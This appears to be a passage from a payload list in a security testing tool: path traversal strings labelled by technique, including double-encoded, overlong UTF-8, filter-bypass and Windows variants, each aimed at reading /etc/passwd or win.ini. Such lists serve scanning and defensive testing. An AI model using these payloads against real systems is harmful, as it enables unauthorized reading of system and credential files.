        {"value": "..\\..\\windows\\win.ini", "type": "windows"},
        {"value": "....//....//....//etc/passwd", "type": "bypass"},
        {"value": "..%252f..%252f..%252fetc/passwd", "type": "double_encode"},
        {"value": "..%c0%af..%c0%af..%c0%afetc/passwd", "type": "utf8_encode"},
        {"value": "/etc/passwd", "type": "absolute"},
        {"value": "c:\\windows\\win.ini", "type": "windows_absolute"},
        {"value": "..\\..\\..\\..\\..\\etc\\passwd", "type": "deep_traverse"},
        {"value": "%2e%2e/etc/passwd", "type": "single_encode"},
